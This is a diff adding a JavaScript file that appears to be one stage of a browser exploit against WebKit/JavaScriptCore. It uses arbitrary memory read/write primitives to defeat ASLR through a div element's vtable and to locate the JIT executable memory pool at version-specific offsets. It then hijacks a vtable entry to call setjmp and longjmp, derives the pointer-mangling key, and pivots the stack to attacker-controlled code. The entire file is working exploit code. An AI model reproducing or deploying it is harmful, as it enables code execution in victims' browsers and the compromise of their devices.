@@ -1,0 +1,132 @@
+//depend on Int64, Primitives
+
+var xor = function(a, b)
+{
+	//result and base
+	var res = 0, base = 1;
+
+	//Perform the exclusive OR
+	for(var i = 0; i < 64; ++i)
+	{
+		res += base * ((a&1) ^(b&1));
+		a = (a-(a&1))/2;
+		b = (b-(b&1))/2;
+		base *= 2;
+	}
+	return res;
+};
+
+function WrapperDiv(primitive, vtable)
+{
+	
+		this.wrapper = document.createElement('div');
+		this._primitive = primitive;
+    //alert("zzz");
+		this.el = primitive.read64(Add(primitive.addrof(this.wrapper), 0x18));
+		//alert("this.el="+this.el);
+		this.v_tlb = primitive.read64(this.el);
+		//alert("this.v_tlb="+this.v_tlb);
+		this.slide = this.v_tlb - vtable;
+		//alert("this.slide="+this.slide);
+		// Get a slid address
+		this.getSlideAddr = function(addr = 0) {
+			return Add(new Int64(addr), this.slide);
+		};
+		//v1
+		this.startOfFixedExecutableMemoryPool = function(startfixedmempool) {
+
+				var startOfFixedExecutableMemoryPoolAddr = this.getSlideAddr(startfixedmempool);
+				startOfFixedExecutableMemoryPool = this._primitive.read64(startOfFixedExecutableMemoryPoolAddr);
+				return startOfFixedExecutableMemoryPool;
+    };
+    //v1
+    this.endOfFixedExecutableMemoryPool = function(endfixedmempool) {
+
+				var endOfFixedExecutableMemoryPoolAddr = this.getSlideAddr(endfixedmempool);	
+				endOfFixedExecutableMemoryPool = this._primitive.read64(endOfFixedExecutableMemoryPoolAddr);
+				return endOfFixedExecutableMemoryPool;
+    };
+    //v2
+    this.startOfFixedExecutableMemoryPoolC8 = function(fixedmempool) {
+
+				var fixed = this._primitive.read64(this.getSlideAddr(fixedmempool));
+				var startOfFixedExecutableMemoryPoolAddr = Add(fixed, 0xc8);
+				startOfFixedExecutableMemoryPool = this._primitive.read64(startOfFixedExecutableMemoryPoolAddr);
+				return startOfFixedExecutableMemoryPool;
+    };
+    //v2
+    this.endOfFixedExecutableMemoryPoolD0 = function(fixedmempool) {
+
+				var fixed = this._primitive.read64(this.getSlideAddr(fixedmempool));
+				var endOfFixedExecutableMemoryPoolAddr = Add(fixed, 0xd0);		
+				endOfFixedExecutableMemoryPool = this._primitive.read64(endOfFixedExecutableMemoryPoolAddr);
+				return endOfFixedExecutableMemoryPool;
+    };
+    //v3
+    this.startOfFixedExecutableMemoryPoolC0 = function(fixedmempool) {
+
+				var fixed = this._primitive.read64(this.getSlideAddr(fixedmempool));
+				var startOfFixedExecutableMemoryPoolAddr = Add(fixed, 0xc0);
+				startOfFixedExecutableMemoryPool = this._primitive.read64(startOfFixedExecutableMemoryPoolAddr);
+				return startOfFixedExecutableMemoryPool;
+    };
+    //v3
+    this.endOfFixedExecutableMemoryPoolC8 = function(fixedmempool) {
+
+				var fixed = this._primitive.read64(this.getSlideAddr(fixedmempool));
+				var endOfFixedExecutableMemoryPoolAddr = Add(fixed, 0xc8);		
+				endOfFixedExecutableMemoryPool = this._primitive.read64(endOfFixedExecutableMemoryPoolAddr);
+				return endOfFixedExecutableMemoryPool;
+    };
+    //v4
+    this.startOfFixedExecutableMemoryPool18 = function(jscconfig) {
+
+				var fixed = this.getSlideAddr(jscconfig);
+				var startOfFixedExecutableMemoryPoolAddr = Add(fixed, 0x18);
+				startOfFixedExecutableMemoryPool = this._primitive.read64(startOfFixedExecutableMemoryPoolAddr);
+				return startOfFixedExecutableMemoryPool;
+    };
+    //v4
+    this.endOfFixedExecutableMemoryPool20 = function(jscconfig) {
+
+				var fixed = this.getSlideAddr(jscconfig);
+				var endOfFixedExecutableMemoryPoolAddr = Add(fixed, 0x20);		
+				endOfFixedExecutableMemoryPool = this._primitive.read64(endOfFixedExecutableMemoryPoolAddr);
+				return endOfFixedExecutableMemoryPool;
+    };
+
+		this.preStackCall = function(_addeventoffset, _setjmp, _x30_orig) {
+	          //alert("aaa");
+						this._primitive.write64(Add(this.v_tlb, _addeventoffset), this.getSlideAddr(_setjmp));
+						//alert("bbb");
+						//sava el,
+						this.el_rawdata = this._primitive.readbytes(this.el,175);
+						//alert(this.el_rawdata);
+						//alert("cc");
+						this.wrapper.addEventListener('click', function () {});
+						//	alert("ddd");
+						//recovery stack
+						this.jmpbuf = this._primitive.readbytes(this.el, 104);		
+						//alert(this.jmpbuf);			
+						this.jmpbufAddr = this._primitive.read64(Add(this._primitive.addrof(this.jmpbuf), 0x10));		
+						//	alert("eee");
+						//calc canary
+						var x30_eor = this._primitive.read64(Add(this.el, 88));//11
+						var x30_orig = this.getSlideAddr(_x30_orig);
+						this.canary = Xor(x30_eor, x30_orig);
+						//	alert("fff");
+		};
+ 
+    //divWrapper.stackCall(_offset.addeventindex*8, _offset.longjmp, _offset.stackloader, gadget.getSp());
+		this.stackCall = function(addeventoffset,longjmp,stackloader,sp) {
+				
+				this._primitive.write64(this.el, this.v_tlb);
+				this._primitive.write64(Add(this.v_tlb, addeventoffset), this.getSlideAddr(longjmp));
+				var eor_stackloader = Xor(this.canary, this.getSlideAddr(stackloader));
+				this._primitive.write64(Add(this.el, 88), eor_stackloader);  //x30
+				var eor_sp = Xor(this.canary, sp);
+				this._primitive.write64(Add(this.el, 96), eor_sp);
+				this.wrapper.addEventListener('click', function () { });
+				this._primitive.writebytes(this.el, this.el_rawdata);
+		};
+}
